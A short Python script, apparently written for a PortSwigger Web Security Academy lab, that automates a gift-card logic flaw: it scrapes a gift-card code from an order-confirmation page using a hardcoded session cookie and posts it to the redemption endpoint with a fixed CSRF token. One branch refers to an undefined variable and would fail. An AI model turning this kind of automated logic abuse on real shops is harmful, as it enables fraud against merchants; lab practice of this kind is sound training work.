import requests

def send_post_request(HOST, content):
    # Define the headers with Cookie and Content-Type
    headers = {
        'Cookie': "session=Vo8yWKakY9FRwfxSHN8g2MCKwKoyPBT7",
        'Content-Type': "application/x-www-form-urlencoded"
    }

    # Define the data payload with the content
    payload = content
    print(payload)
    try:
        # Send the POST request
        response = requests.post(HOST, headers=headers, data=payload)
        if response.status_code == 302:
            # Extract data from the Location header
            redirected_url = response.headers.get('Location')
            print("Redirected URL:", redirected_url)
            print("Data from redirected URL:", redirected_response.text)
        # Check the response status
        if response.status_code == 200:
            print("POST request successful!")
            print("Response:", response.text)
        else:
            print("POST request failed with status code:", response.status_code)

    except requests.RequestException as e:
        print("Error sending POST request:", e)

def get_request(url, params, headers):
        try:
                response = requests.get(url, params=params, headers=headers)
                if response.status_code == 200:
                        print("GET request successful!")
                        lines = response.text.splitlines()
                        line_index = 96
                        desired_line = lines[line_index]
                        global extracted_text 
                        extracted_text = desired_line[36:-5]

                        print("Extracted text:", extracted_text)
                else:
                        print("GET request failed with status code:", response.status_code)
        except requests.RequestException as e:
                print("Error sending GET request:", e)
extracted_text = ""

get_request("https://0a2c004a0387c920815c9dca000b00c6.web-security-academy.net/cart/order-confirmation",{'order-confirmed': 'true'},{'Cookie': "session=Vo8yWKakY9FRwfxSHN8g2MCKwKoyPBT7"})
print(extracted_text)
send_post_request("https://0a2c004a0387c920815c9dca000b00c6.web-security-academy.net/gift-card", f"csrf=VRXPC3h2lnpKeaP1NVLR9sLu1ab6Bspp&gift-card={extracted_text}")
